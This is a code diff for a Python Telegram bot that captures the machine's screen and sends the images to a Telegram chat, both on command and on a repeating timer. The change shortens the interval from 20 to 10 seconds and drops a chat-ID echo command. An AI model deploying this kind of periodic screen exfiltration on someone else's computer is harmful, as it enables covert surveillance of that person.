@@ -17,9 +17,6 @@ def func(message):
         if(message.text == "get screenshot"):
             png = get_screenshots_bytes()
             bot.send_photo(message.chat.id, png)
-        elif(message.text == "1"):
-            bot.send_message(message.chat.id, text=f'{message.chat.id}')
-            
     else: bot.send_message(message.chat.id, text='Простите, у вас нет доступа')
     
 def Work():
@@ -38,7 +35,7 @@ def screengrab():
         print("screenshot sended")
         png = get_screenshots_bytes()
         bot.send_photo(chatid, png)
-        time.sleep(20)
+        time.sleep(10)
         screengrab()
     except Exception as e:
         print(e)
